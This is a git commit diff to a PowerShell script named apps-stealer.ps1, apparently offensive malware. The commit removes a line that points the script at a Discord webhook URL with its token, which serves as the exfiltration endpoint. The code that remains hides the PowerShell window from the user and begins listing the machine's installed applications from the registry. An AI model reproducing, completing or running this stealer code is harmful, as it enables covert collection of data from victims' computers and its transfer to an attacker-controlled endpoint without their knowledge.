04f59928be18524aa0b48a81285b1a8379bc87fd
Jakov C <qwerasdftzu@gmail.com>
2024-02-06 19:26:16 +0100

    Quick fix

--- apps-stealer/apps-stealer.ps1
+++ apps-stealer/apps-stealer.ps1
@@ -1,4 +1,3 @@
-$dc = "https://discord.com/api/webhooks/1167797406386094191/dRg_yctHuS3NHn-V7uU03w7xc_tsTJGTGMT4LUI4C87POMlVcfws0RWKIwnPHx9UFut8"
 $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion; $y = $v.Substring(0, 2); if ($y -gt 21) { $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru; $hwnd = (Get-Process -PID $pid).MainWindowHandle; if ($hwnd -ne [System.IntPtr]::Zero) { $Type::ShowWindowAsync($hwnd, 0) }else { $Host.UI.RawUI.WindowTitle = 'hideme'; $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }); $hwnd = $Proc.MainWindowHandle; $Type::ShowWindowAsync($hwnd, 0) } };
 # Get a list of all installed applications
 $apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
